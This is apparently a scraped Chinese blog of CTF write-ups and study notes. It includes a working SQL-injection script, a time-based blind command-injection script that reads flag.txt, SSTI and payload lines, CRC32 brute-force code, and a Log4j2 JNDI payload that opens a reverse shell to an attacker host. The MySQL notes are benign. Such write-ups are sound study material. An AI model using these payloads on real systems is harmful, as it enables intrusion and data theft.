本地做测试：创建一个文本文件修改内容如下 测试结果如下： 显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件 存在ssti漏洞，开始利用，调用os模块 调用popen()方法。 上传文件，获取flag。 Miscpng附件下载下来是一张png图片， 010打开划拉到最底部发现冗余数据，部分flagFCTF{To， 010跑PNGTemplate.bt脚本报错，左下提示CRC不匹配，说明修改了高宽却没有修改CRC导致读取报错，图片宽高很可能被修改过。(或者放入kali中无法打开) 进行一个高度的改，将高度640改为700 文件头数据块IHDR包含的第一部分数据就是图片宽高，分别对应第二行中的第一组四个字节和第二组四个字节，掏出计算器算算高度拉长点。 得到另一部分flag：_the_flawless_ 然后就是做这道题时比较懵逼的一个地方了，招最后一部分flag。先开起zsteg看看能拿到什么吧。查到了之前找到的FCTF{To，但是愣是没发现最后一部分flag，如果有LSB隐写那zsteg也应该能淦出来才对呀？ 由于过于依赖工具，死磕这条路坚信不存在lsb隐写。愣是没用Stegsolve手搓，到处找，查IDAT块、翻EXIF信息…最后还得感谢ixout手搓LSB出来。 呜呜呜呜呜呜呜呜呜呜。 最后三段flag拼接起来得到flag。 呜呜呜呜呜呜呜呜呜呜。 cet6一道基础的USB取证题，但是不太常规。。。 zip套娃第一层： binwalk无法分离，不是伪加密。没给其他条件明文攻击也不太行，那就爆破试试吧（。 ARCHPR开起来，攻击方式字典，选的是kali字典。跑了一段时间后成功拿到第一层密码。 第二层： 依然先丢到kali里binwalk试下，分离成功，伪加密 分离出来的东西多了个0.zip打开其实就是第二层的包不过问题不大，直接看第三层的压缩包 第三层： 打开压缩包看到了一个支点.txt文件，同时第二层解压出来后也有一个支点.txt，支点.txt文件大小大于12字节，大胆猜测是明文攻击。 WinRAR将泄密出来的文件压缩为zip，开始明文攻击，然后就。。。 相信不止我一个人遇到这种情况。。。这里我们忽略了一些细节，加密文件是通过什么方式压缩的呢？不同压缩软件采用的压缩算法也会不同，自然会出现不匹配的情况，这里多尝试几次，鼠标右键发送到压缩文件可行，开始明文攻击 等待了一段时间之后拿到秘钥(btw这一坨是啥。。。) 第四层： 字典、明文、伪加密，各种姿势都试过了，打开压缩包看一眼，分散成这么多小文件，大胆猜测CRC碰撞 EXIF查看一下压缩文件数据，CRC32、字节数等等 大致整理下6个文本文件的CRC32、字节数： 文件名 CRC32 字节数 1.txt 0x92716b7c 5 2.txt 0x1ab6bb72 4 3.txt 0xfcf21afd 3 4.txt 0x89a155cb 5 5.txt 0x2d09a3d6 6 6.txt 0xe3f20a9d 2 1-3字节的脚本如下： 123456789101112131415161718192021222324'''1byte'''import binasciiimport stringdef crack_crc(): print('-------------Start Crack CRC-------------') crc_list = [0xda6fd2a0, 0xf6a70, 0x70659eff, 0x862575d]#文件的CRC32值列表，注意顺序 comment = '' chars = string.printable for crc_value in crc_list: for char1 in chars: char_crc = binascii.crc32(char1.encode())#获取遍历字符的CRC32值 calc_crc = char_crc &amp; 0xffffffff#将获取到的字符的CRC32值与0xffffffff进行与运算 if calc_crc == crc_value:#将每个字符的CRC32值与每个文件的CRC32值进行匹配 print('[+] {}: {}'.format(hex(crc_value),char1)) comment += char1 print('-----------CRC Crack Completed-----------') print('Result: {}'.format(comment))if __name__ == '__main__': crack_crc() 1234567891011121314151617181920212223242526'''2bytes'''import binasciiimport stringdef crack_crc(): print('-------------Start Crack CRC-------------') crc_list = [0xe3f20a9d]#文件的CRC32值列表，注意顺序 comment = '' chars = string.printable for crc_value in crc_list: for char1 in chars: for char2 in chars: res_char = char1 + char2#获取遍历的任意2Byte字符 char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值 calc_crc = char_crc &amp; 0xffffffff#将获取到的字符的CRC32值与0xffffffff进行与运算 if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配 print('[+] {}: {}'.format(hex(crc_value),res_char)) comment += res_char print('-----------CRC Crack Completed-----------') print('Result: {}'.format(comment))if __name__ == '__main__': crack_crc() 1234567891011121314151617181920212223242526'''3bytes'''import binasciiimport stringdef crack_crc(): print('-------------Start Crack CRC-------------') crc_list = [0x92716b7c, 0x1ab6bb72, 0xfcf21afd, 0x89a155cb, 0x2d09a3d6, 0xe3f20a9d]#文件的CRC32值列表，注意顺序 comment = '' chars = string.printable for crc_value in crc_list: for char1 in chars: for char2 in chars: for char3 in chars: res_char = char1 + char2 + char3#获取遍历的任意3Byte字符 char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值 calc_crc = char_crc &amp; 0xffffffff#将遍历的字符的CRC32值与0xffffffff进行与运算 if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配 print('[+] {}: {}'.format(hex(crc_value),res_char)) comment += res_char print('-----------CRC Crack Completed-----------') print('Result: {}'.format(comment))if __name__ == '__main__': crack_crc() 4-6字节的使用theonlypwner工具，修改供选字符 12permitted_characters = set( map(ord, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}!')) # \\w FTCF{ Y0u_ _z1p_ master 拼接起来就是FTCF{Y0u_4re_z1p_master!} 使用theonlypwner时出了点问题，最开始忘记了flag中必含的”{“”}”字符，导致怎么都跑不出来，还是看了眼hint想起来应该修改脚本中的供选字符。如果感叹号是在4-6字节的那些文件的话肯定也跑不出来了，考虑问题还是不够周到。 （大佬的博客：https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html） （CTFwiki：https://ctf-wiki.org/misc/archive/zip/#_7） 正式赛WebMiscPuzzle附件如图所示： 一整张图构成极其简单，想要藏什么数据的话大概率只能是IDAT块隐写了，pngcheck查看下 9个IDAT块，块长度没有隐藏什么特殊信息，一张正常的png图片的IDAT块的前面的块应该都是填充满且相同大小的，这个check结果显然就不正常，感觉每一个块都单独成图。试着删除块。 tweakpng： 准备删IDAT块，九个块就拷贝九份先。删块的时候不要把IEND块删了，这是png格式的结尾标识。 每个IDAT块单独成一张图片，已经很明显了，是一张二维码。 自己对于二维码结构的认知只有三个定位块（悲），所以瞎拼，然后都没法扫（，根据学长放的hint： 归纳就是三个定位块的周围一个像素块的一圈必须是空白的，且相互之间有黑白像素块交叉分布的定时标志，根据特征拿到ps里拼了下 扫一下，拿到flag： FCTF{n1ce_puzzl3} 自信音游人附件是给的曲目选自阿卡伊的だいあるのーと。","link":"/2023/04/27/FCTF/"},{"title":"Litctf2023","text":"LITCTF2023WebMy boss left123456789101112131415161718192021&lt;?php// Check if the request is a POST requestif ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { // Read and decode the JSON data from the request body $json_data = file_get_contents('php://input'); $login_data = json_decode($json_data, true); // Replace these values with your actual login credentials $valid_password = 'dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk'; // Validate the login information if ($login_data['password'] == $valid_password) { // Login successful echo json_encode(['status' =&gt; 'success', 'message' =&gt; 'LITCTF{redacted}']); } else { // Login failed echo json_encode(['status' =&gt; 'error', 'message' =&gt; 'Invalid username or password']); }}?&gt; 用户输入的密码和$valid_password相同就行了，从源代码可以直接读到密码，签到题不多说 unsecure根据要求，去/welcome 去login 根据题干给的用户名’admin’，密码’password123’，登录 页面重定向到这里： 根据提示，而且肉眼可见的url框里url在变，这里使用bp拦截抓个包 这里有个重定向地址 又抓到一个/ornot的地址： LITCTF{0k4y_m4yb3_1_l13d} pingpong页面是这样的，看到输入来执行ping命令推测后端存在命令执行语句，那就可能存在任意命令执行漏洞 源代码如下： 1234567891011121314from flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route('/', methods = ['GET','POST'])def index(): output = None if request.method == 'POST': hostname = request.form['hostname'] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template('index.html', output=output) 用管道符连接命令，具体在BUU刷题记录里有 amogsus-api点开页面如下： 给了点提示用postman来做，之前没听说过，先看看源代码吧； 源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121import randomimport stringfrom flask import Flask, request, jsonifyimport sqlite3from flask_cors import CORSapp = Flask(__name__)CORS(app)con = sqlite3.connect('database.db')sessions = []with sqlite3.connect('database.db') as con: cursor = con.cursor() cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, sus BOOLEAN)')@app.route('/', methods=['GET'])def index(): return jsonify({'message': 'Welcome to the amogsus API! I\\'ve been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!'})@app.route('/signup', methods=['POST'])def signup(): with sqlite3.connect('database.db') as con: cursor = con.cursor() data = request.form print(data) username = data['username'] password = data['password'] sus = False cursor.execute('SELECT * FROM users WHERE username=?', (username,)) if cursor.fetchone(): return jsonify({'message': 'Username already exists!'}) else: cursor.execute('INSERT INTO users (username, password, sus) VALUES (?, ?, ?)', (username, password, sus)) con.commit() return jsonify({'message': 'User created! You can now login at /login'})@app.route('/login', methods=['POST'])def login(): with sqlite3.connect('database.db') as con: cursor = con.cursor() data = request.form try: username = data['username'] password = data['password'] cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password)) user = cursor.fetchone() if user: randomToken = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40)) while randomToken in sessions: randomToken = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40)) sessions.append({'username': username, 'token': randomToken}) return jsonify({'message': 'Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...', 'token': randomToken}) else: return jsonify({'message': 'Login failed!'}) except Exception as e: print(e) return jsonify({'message': 'Please provide your username and password as form-data or x-www-form-urlencoded!'})@app.route('/account', methods=['GET'])def account(): with sqlite3.connect('database.db') as con: cursor = con.cursor() token = request.headers.get('Authorization', type=str) token = token.replace('Bearer ', '') if token: for session in sessions: if session['token'] == token: cursor.execute('SELECT * FROM users WHERE username=?', (session['username'],)) user = cursor.fetchone() return jsonify({'message': 'Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...', 'username': user[1], 'sus': user[3], &quot;password&quot;: user[2]}) return jsonify({'message': 'Invalid token!'}) else: return jsonify({'message': 'Please provide your token!'}) @app.route('/account/update', methods=['POST'])def update(): with sqlite3.connect('database.db') as con: cursor = con.cursor() token = request.headers.get('Authorization', type=str) token = token.replace('Bearer ', '') if token: for session in sessions: if session['token'] == token: data = request.form username = data['username'] password = data['password'] if (username == '' or password == ''): return jsonify({'message': 'Please provide your new username and password as form-data or x-www-form-urlencoded!'}) cursor.execute(f'UPDATE users SET username=&quot;{username}&quot;, password=&quot;{password}&quot; WHERE username=&quot;{session[&quot;username&quot;]}&quot;') con.commit() session['username'] = username return jsonify({'message': 'Account updated!'}) return jsonify({'message': 'Invalid token!'}) else: return jsonify({'message': 'Please provide your token!'})@app.route('/flag', methods=['GET'])def flag(): with sqlite3.connect('database.db') as con: cursor = con.cursor() token = request.headers.get('Authorization', type=str) token = token.replace('Bearer ', '') if token: for session in sessions: if session['token'] == token: cursor.execute('SELECT * FROM users WHERE username=?', (session['username'],)) user = cursor.fetchone() if user[3]: return jsonify({'message': f'Congrats! The flag is: flag{open(&quot;./flag.txt&quot;, &quot;r&quot;).read()}'}) else: return jsonify({'message': 'You need to be an sus to view the flag!'}) return jsonify({'message': 'Invalid token!'}) else: return jsonify({'message': 'Please provide your token!'}) if __name__ == '__main__': app.debug = True app.run(host='0.0.0.0', port=8080) 根据代码，先去访问一下/signup 一开始没反应过来，看了一眼路由设置： 1@app.route('/signup', methods=['POST']) 哦吼，只能POST传参啊，那不管是用hackbar还是bp抓包，或者在浏览器里进行请求，浏览器都会通过GET请求来获取页面内容。那想要只发送post请求，我想到了编写python脚本： 导入requests模块，定义5个url 1234567import requestsurl1 = 'http://litctf.org:31783/signup'url2 = 'http://litctf.org:31783/login'url3 = 'http://litctf.org:31783/account'url4 = 'http://litctf.org:31783/account/update'url5 = 'http://litctf.org:31783/flag' /路由内容： 123@app.route('/', methods=['GET'])def index(): return jsonify({'message': 'Welcome to the amogsus API! I\\'ve been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!'}) /signup路由： 这里就是输入用户名和密码注册一个新账户，因为sql语句进行了预编译处理，所以在这里作为突破点不太现实，脚本部分： 1234567username = 'potatowo2'password = '123'r1 = requests.post(url1,data={'username':username,'password':password}).textprint(r1) 运行结果： 1{&quot;message&quot;:&quot;User created! You can now login at /login&quot;} 再看/login路由： 是一个后台生成登录后生成token并存入session的过程，sql语句依旧是使用了预编译，对应脚本内容： 12345r2 = requests.post(url2,data={'username':username,'password':password})r2json = r2.json()print(r2json) 这里的json步骤是必要的，如果使用.text获取请求内容，是字符串而不是json，后续操作获取token起来会出问题 返回内容： 1{'message': 'Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...', 'token': '6WL12DAQ71INQ0AA3CNYKVIG7ND7GF2OT0U0U9VA'} 接着审计/account： 这里服务端获取请求头中的Authorization，并且将其中的’Bearer ‘替换为空字符串，session中的token与上一步返回json中token值相同，因为去掉’Bearer ‘后要和那个token进行比较相同，所以构造header时在token前加上该字符串，还是预编译sql语句，对应脚本： 123456789token = r2json['token']headers = { 'User-Agent': 'Mozilla/5.0', 'Authorization': f'Bearer {token}'}r3 = requests.get(url3,headers = headers).textprint(r3) 返回内容： 1{&quot;message&quot;:&quot;Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...&quot;,&quot;password&quot;:&quot;123&quot;,&quot;sus&quot;:0,&quot;username&quot;:&quot;potatowo233&quot;} 接着看/flag： 获取flag的条件： 和上一步一样的请求头处理，然后遍历所有的session，如果该sesssion对应的token与用户传入的相同，则在数据库中查询对应用户名的用户信息，如果查询结果的user[3]值为真，则输出flag。这里user[3]是什么呢？ 在/account代码中： 但是这个sus变量从程序的开始(/signup)就被赋值为false了啊： 不急，继续往下看/account/update的代码： 还是拿着刚刚的header去访问，然后更新此时会话对应的用户密码，与之前不同的是，这里的sql语句没有进行预编译，而且没有任何过滤，这不是纯纯的SQL注入了吗，思路非常明确，我们要获得flag，就得使sus为True，但是sus从一开始就被定下来了，所以只能通过sql注入来更新sus的值了，更新完之后，去访问/flag即可，对应脚本： 123456789password = f'''111&quot;,sus = 'True' where username = &quot;{username}&quot; --'''print(password)r4 = requests.post(url4,data={'username':username,'password':password},headers = headers).textprint(r4)r5 = requests.get(url5,headers = headers).textprint(r5) 返回内容： 123{&quot;message&quot;:&quot;Account updated!&quot;}{&quot;message&quot;:&quot;Congrats! The flag is: flagLITCTF{1njeC7_Th3_sUs_Am0ng_U5}&quot;} 一整个脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsurl1 = 'http://litctf.org:31783/signup'url2 = 'http://litctf.org:31783/login'url3 = 'http://litctf.org:31783/account'url4 = 'http://litctf.org:31783/account/update'url5 = 'http://litctf.org:31783/flag'params = {}username = 'potatowo233'password = '123'r1 = requests.post(url1,data={'username':username,'password':password}).textprint(r1)r2 = requests.post(url2,data={'username':username,'password':password})r2json = r2.json()print(r2json)token = r2json['token']headers = { 'User-Agent': 'Mozilla/5.0', 'Authorization': f'Bearer {token}'}r3 = requests.get(url3,headers = headers).textprint(r3)password = f'''111&quot;,sus = 'True' where username = &quot;{username}&quot; --'''print(password)r4 = requests.post(url4,data={'username':username,'password':password},headers = headers).textprint(r4)r5 = requests.get(url5,headers = headers).textprint(r5) license-inject上传一个图片然后获取图片上的文字，再返回文字的查询结果，这里审计源代码时运气非常好，顺着src/routes/api，对图片内容的识别肯定是调用外部接口的，那就审计这里面的代码。 注意到这里有一个查询语句： 1db.get(`SELECT * FROM plates WHERE plate = &quot;${text}&quot;`, (err, row)=&gt;{....}) 这不是很容易一下子就联想到是把api传回的数据进行查询然后返回信息吗，继续看看 这里定义了两个plates： 1234567891011121314plates.push({ name: 'codetiger', // very long random string plate: Array(40) .fill('') .map(() =&gt; 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)]) .join(''), fine: 'LITCTF{redacted}'});plates.push({ name: 'Sample User', plate: '215BG2', fine: '$6942'); 结合查询语句和图片的信息，只需要闭合原引号，然后查询name=’codetiger’，就可以传回codetiger的信息了，自然也就输出flag了 payload语句：&quot; or name = 'codetiger';--， 剩下的工作就是把这几个字搞成图片了，ps里输入文本，各种改字体，各种截图都失败了，理论上没问题啊，是不是还有图片的尺寸之类的校验，然后就把范例图片拿去ps改，还是不行。最后，解决方案是，在Typra里输入payload，然后截图一下就没了。。。 Ping Pong: Under Maintenance看了眼代码，和上题tiger，差在了无法把执行内容直接输出，意思就是说环境在维修中 123456789101112131415from flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route('/', methods = ['GET','POST'])def index(): output = None if request.method == 'POST': hostname = request.form['hostname'] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.') 虽然无法显示，但是还是存在命令执行的，那就尝试盲注 命令拼接过程中，先是试了下|nc ip，发现没法，应该靶机上没装nc，那就试试curl，居然也不行？？然后有点迷惑，我直接ping服务器还不行吗？服务器上tshark开启抓包，只抓icmp协议的，结果也没抓到任何包？？ 判断没出网，当时想到的是sh脚本语句，是类似于编程语言的存在逻辑if语句，因此可能存在类似于SQL中的盲注，去学习了下，Linux中存在sleep： 1sleep 10#延迟十秒 传入|sleep 10，网页肉眼可见出现延迟，配合if语句 1234if [ ... ];then &lt;cmd&gt;elif [ ... ];then &lt;cmd&gt;else &lt;cmd&gt;fi 结合管道符和cut语句： 最终构造脚本： 123456789101112131415161718192021import requestsimport timeimport stringurl = 'http://34.130.180.82:56409/'flag = ''pre = string.ascii_uppercase + '234567='for i in range(1,200): for j in pre: s_time = time.time() payload = f'''|if [ `cat flag.txt|base32|cut -c {i}` = '{j}' ];then sleep 4;fi''' r = requests.post(url,data={ 'hostname':payload }) e_time = time.time() exec_time = e_time - s_time if exec_time &gt; 4: flag += j print(flag) break 另一种方法：flask的静态目录(static)，是可以直接通过浏览器访问的，所以可以把命令执行的结果写入其中： 12|mkdir static|cat flag.txt &gt; flag 在通过浏览器直接访问http://ip/static/flag即可 fetchMisc后续更新ing","link":"/2023/08/09/Litctf2023/"},{"title":"Minecraft-ApacheLog4j2","text":"Minecraft中的Log4j2漏洞复现准备工作： Minecraft服务器一台(靶机IP:targeted_ip) Minecraft1.7-1.18官方服务端 攻击机一台(攻击机IP:hacking_ip) 复现过程：下载工具JNDIExploit 根据操作文档： 在攻击机上开启jndi服务： 攻击机开启监听端口： 根据操作文档，构造： 1ldap://hacking_ip:1389/Basic/ReverseShell/hacking_ip/7890 最终payload： 1${jndi:ldap://hacking_ip:1389/Basic/ReverseShell/hacking_ip/7890} 进入服务器，在聊天框内输入payload： 反弹shell： 可能导致线程崩溃，拿到shell之后重新开服即可 参考资料： Minecraft处Log4j漏洞报告 JNDIExploit工具 Minecraft开服","link":"/2023/10/11/Minecraft-ApacheLog4j2/"},{"title":"PHP魔术方法","text":"","link":"/2024/01/01/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"NSSCTF","text":"NSSCTF做题记录","link":"/2023/03/11/NSSCTF/"},{"title":"ROIS_Summer","text":"ROIS夏令营 WEEK1MySQL学习记录解决mysql任意密码登录的问题： 123update user set plugin=&quot;mysql_native_password&quot;;flush privileges;#重启mysql服务 docker拉mysql： 12docker pull mysql:latest#可将latest换成具体的版本号docker images 1docker run -d --name=mysql-server -p 3306:3306 -v mysql-data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=your_password mysql 7.9配置环境参考docker-note中文章 默认在3306端口运行MySQL服务。 数据库管理系统： 用来管理数据库中数据的，对数据增删查改。常见：MySQL、DB2、Oracle等。 执行MySQL命令时注意以分号结尾，不见分号不执行 SQL语句不区分大小写 常用命令： 12345show databases;#查看有哪些数据库use &lt;DB&gt;;#使用某个数据库(自带4个数据库，SQLI注入时与其中某些息息相关，存有数据库表名等等信息)create database &lt;DB&gt;;#创建数据库exit;#退出show tables;#查看某个数据库内的表 表(table)： 行(row) 列(字段)(column) SQL语句： DQL：数据查询语言(带SELECT) 12345678910111213SELECT &lt;字段名&gt; FROM &lt;表名&gt;#如果查询多个字段字段间用逗号隔开，查询全部用*或者一个一个字段敲进去，星号效率低，实际开发不建议使用SELECT &lt;字段1&gt;,&lt;字段2&gt;,&lt;字段3&gt;... FROM &lt;表名&gt; WHERE &lt;条件&gt;;#条件中&gt;、&lt;、&gt;=、&lt;=、=不用赘述，between .. and ..介于两者之间(左小右大)、&lt;&gt;或!=不等于、or 或、and 与#同大多数编程语言一样，and优先级高于or，最好用括号明确逻辑层次SELECT ...FROM ...WHERE ...GROUP BY ...ORDER BY ...;#关键字顺序不能错 DML：数据操作语言(对表当中数据增删改) 123INSERT#增DELETE#删UPDATE#改 DDL：数据定义语言(CREATE、DROP、ALTER，主要操作表结构而不是修改数据，如删掉某列，增加新的一个字段、创建、删除表) 1234CREATE#新建ALTER#修改DROP#删除#不同于DML对表数据的增删改，DDL是对表结构进行操作 TCL：事务控制语言 12COMMIT#事务提交ROLLBACK#事务回滚 DCL：数据控制语言 123#eg:GRAND#授权REVOKE#撤销权限 下面用上面学到操作的先制作一个测试用数据库练练手 先看一下有哪些数据库 show databases;，之前复现题目环境时创建了个flag数据库，正好可以试下删除数据库的操作 use flag;进入该数据库，show tables;查看数据库内所有表 浅查一下 查完，删表跑路（bushi 可以看到我们的test数据库内只有一个flag表，下面删除该表drop table flag; 使用drop table &lt;表名&gt;;删表，这时候我们再查数据库中的表名，已经是空的了，那一不做二不休，试一下删数据库drop database flag; 可以看到flag数据库已经被删除了。 这里先开navicat可视化快速创个数据库然后导出，一会尝试从文件导入 导入文件的时候踩了个坑(其实还有个坑，这个坑也是几乎所有编程语言共有的，养成良好习惯从我做起（，路径中憋整中文) 使用命令source &lt;file_url&gt;;导入sql文件(意外发现其实source命令也可以不需要分号，但是养成好习惯，都加) 要先选中一个数据库再导入 如图所示便导入成功： 查看表结构，不看数据，使用describe &lt;表名&gt;;命令(或者desc &lt;表名&gt;也可) 然后感觉自己创的表太草率了，找了个更好的数据库导入了（ 下面进行desc查表结构以及使用as关键字对查询字段起别名(注意as只对一个字段生效)(as可省，但是注意别名和真名间不要有逗号)： 起别名不对原表字段名造成影响 SELECT语句永远无法进行修改操作 在所有数据库中，字符串是用单引号括起来的，双引号在Oracle中无法使用但是在MySQL中可以，例别名中有空格别名用单引号括起来 字段可以使用数学表达式： 7.10 MySQL中NULL不能用=衡量，只能用is/is not，因为数据库中的NULL是表示该位置为空，而不是一个值，是一个属性 IN关键字(等价于多个or)，取反用not in()： like(模糊查询，sql注入会使用到)： ‘%’匹配任意个字符（可理解为正则表达式.*?）； ‘_’一个下划线只匹配一个字符（可以理解为正则表达式的.）； eg： 查询名字里含有字符’o’的： 1select ename from emp where ename like '%o%'; OUTPUT: eg： 以T结尾 1select ename from emp where ename like '%T'; 以K开始 1select ename from emp where ename like 'K%'; 找出第二个字母是A的 1select ename from emp where ename like '_A%'; 找出含下划线的 1select ename from emp where ename like '%\\_%';#使用转义字符'\\' order by排序： order by sal默认升序，指定降序order by sal desc(descend)，指定升序order by sal asc(ascend) 多字段排序： 12#查询员工名字和薪资，要求按照薪资升序，薪资相同按照名字升序select ename,sal from emp order by sal asc,ename asc;#sal在前起主导，sal相等时才比较ename 根据字段位置排序(sql注入常用) 1select ename,sal from emp order by 2;#2表示第二列 数据处理函数： 123456789101112Lower()#转换小写Upper()#转换大写******Substr()#取子串(sub(string,start,length))******Length()#取长度Trim()#去空格str_to_date()#将字符串转化成日期data_format()#格式化日期format()#设置千分位round()#四舍五入，用法：round(待变值，保留小数位)rand()#生成随机数******concat()#字符串拼接，而不能用加号ifnull()#将null赋予值，ifnull(数据，被当做哪个值)，如果数据是null,将数据当做哪个值 substr()起始下标从1开始而不是0！ 找出员工名字第一个字母是A的员工信息？ 两种方法： select ename from emp where ename like 'A%'; select ename from emp where substr(ename,1,1)='A'; 12345678910111213141516171819 select ename,sal + comm as salcomm from emp;#数据库中有null参与的数据运算结果都为null+--------+---------+| ename | salcomm |+--------+---------+| SMITH | NULL || ALLEN | 1900.00 || WARD | 1750.00 || JONES | NULL || MARTIN | 2650.00 || BLAKE | NULL || CLARK | NULL || SCOTT | NULL || KING | NULL || TURNER | 1500.00 || ADAMS | NULL || JAMES | NULL || FORD | NULL || MILLER | NULL |+--------+---------+ ifnull()的用途： 12345678910111213141516171819select ename,sal + ifnull(comm,0) as salcomm from emp;+--------+---------+| ename | salcomm |+--------+---------+| SMITH | 800.00 || ALLEN | 1900.00 || WARD | 1750.00 || JONES | 2975.00 || MARTIN | 2650.00 || BLAKE | 2850.00 || CLARK | 2450.00 || SCOTT | 3000.00 || KING | 5000.00 || TURNER | 1500.00 || ADAMS | 1100.00 || JAMES | 950.00 || FORD | 3000.00 || MILLER | 1300.00 |+--------+---------+ case...when...then...when...then...else...end： 1234567891011121314151617181920#eg:当员工工作岗位是MANAGER时工资上调10%，当员工工作岗位是SALESMAN时工资上调15%，其他正常 select ename,job,sal as oldsal,(case job when 'MANAGER' then sal*1.1 when 'SALESMAN' then sal*1.5 else sal end) as newsal from emp;+--------+-----------+---------+---------+| ename | job | oldsal | newsal |+--------+-----------+---------+---------+| SMITH | CLERK | 800.00 | 800.00 || ALLEN | SALESMAN | 1600.00 | 2400.00 || WARD | SALESMAN | 1250.00 | 1875.00 || JONES | MANAGER | 2975.00 | 3272.50 || MARTIN | SALESMAN | 1250.00 | 1875.00 || BLAKE | MANAGER | 2850.00 | 3135.00 || CLARK | MANAGER | 2450.00 | 2695.00 || SCOTT | ANALYST | 3000.00 | 3000.00 || KING | PRESIDENT | 5000.00 | 5000.00 || TURNER | SALESMAN | 1500.00 | 2250.00 || ADAMS | CLERK | 1100.00 | 1100.00 || JAMES | CLERK | 950.00 | 950.00 || FORD | ANALYST | 3000.00 | 3000.00 || MILLER | CLERK | 1300.00 | 1300.00 |+--------+-----------+---------+---------+ 7.11 分组函数： 输入多行，输出一行 12345count()#计数，count(*)表示统计所有行数，count(具体字段)代表统计该字段下不为null的sum()#求和avg()#平均值max()#最大值min()#最小值 分组函数自动忽略null，不需要对null进行处理 分组函数在使用时必须分组，没分组默认整张表是一组 分组函数不能直接使用在where语句： 12345678select ename,sal from emp where sal &gt; min(sal);#表面上没问题ERROR 1111 (HY000): Invalid use of group function#实际报错，无效使用分组函数#为什么？分组查询(group by)#分组函数在使用时必须先分组，但是WHERE语句在执行时排在GROUP BY后面，此时还没分组#为什么select sum(sal) from emp;不用分组也能用呢？#因为执行顺序#from,where,group by,select,order by，select在group by之后执行 分组查询：(SQL注入常用) 123456789101112#找出每个工作岗位的工资和？#思路：按工作岗位分组，对工资求和select job,sum(sal) from emp group by job;+-----------+----------+| job | sum(sal) |+-----------+----------+| ANALYST | 6000.00 || CLERK | 4150.00 || MANAGER | 8275.00 || PRESIDENT | 5000.00 || SALESMAN | 5600.00 |+-----------+----------+ 在一条SELECT语句中如果有GROUP BY，SELECT后面只能跟参加分组的字段和分组函数： 12345678910111213141516171819202122232425262728293031323334353637select ename,sal,deptno from emp;#先查一下表，可以看到10部门中最高工资是KING，20部门中最高工资是FORD和SCOTT，30部门中最高工资是BLAKE+--------+---------+--------+| ename | sal | deptno |+--------+---------+--------+| SMITH | 800.00 | 20 || ALLEN | 1600.00 | 30 || WARD | 1250.00 | 30 || JONES | 2975.00 | 20 || MARTIN | 1250.00 | 30 || BLAKE | 2850.00 | 30 || CLARK | 2450.00 | 10 || SCOTT | 3000.00 | 20 || KING | 5000.00 | 10 || TURNER | 1500.00 | 30 || ADAMS | 1100.00 | 20 || JAMES | 950.00 | 30 || FORD | 3000.00 | 20 || MILLER | 1300.00 | 10 |+--------+---------+--------+select deptno,max(sal) from emp group by deptno;#查一下每个部门的最高工资+--------+----------+| deptno | max(sal) |+--------+----------+| 10 | 5000.00 || 20 | 3000.00 || 30 | 2850.00 |+--------+----------+select ename,deptno,max(sal) from emp group by deptno;#select后加上ename+-------+--------+----------+| ename | deptno | max(sal) |+-------+--------+----------+| CLARK | 10 | 5000.00 || SMITH | 20 | 3000.00 || ALLEN | 30 | 2850.00 |+-------+--------+----------+#结果可以看到ename和后面的工资部门信息并不对应，ename无意义，并且Oracle中会报错#如果想实现输出预期结果，需要用到表连接 按多个字段联合分组： 123456789101112131415161718192021222324252627282930313233343536373839#找出每个部门，不同工作岗位的最高薪资select ename,job,sal,deptno from emp order by deptno;#先查询下按部门分组情况，为便于分析，按部门排序+--------+-----------+---------+--------+| ename | job | sal | deptno |+--------+-----------+---------+--------+| MILLER | CLERK | 1300.00 | 10 || KING | PRESIDENT | 5000.00 | 10 || CLARK | MANAGER | 2450.00 | 10 || FORD | ANALYST | 3000.00 | 20 || ADAMS | CLERK | 1100.00 | 20 || SCOTT | ANALYST | 3000.00 | 20 || JONES | MANAGER | 2975.00 | 20 || SMITH | CLERK | 800.00 | 20 || BLAKE | MANAGER | 2850.00 | 30 || MARTIN | SALESMAN | 1250.00 | 30 || TURNER | SALESMAN | 1500.00 | 30 || WARD | SALESMAN | 1250.00 | 30 || JAMES | CLERK | 950.00 | 30 || ALLEN | SALESMAN | 1600.00 | 30 |+--------+-----------+---------+--------+select deptno,job,max(sal) from emp group by deptno,job;#联合分组查询+--------+-----------+----------+| deptno | job | max(sal) |+--------+-----------+----------+| 10 | CLERK | 1300.00 || 10 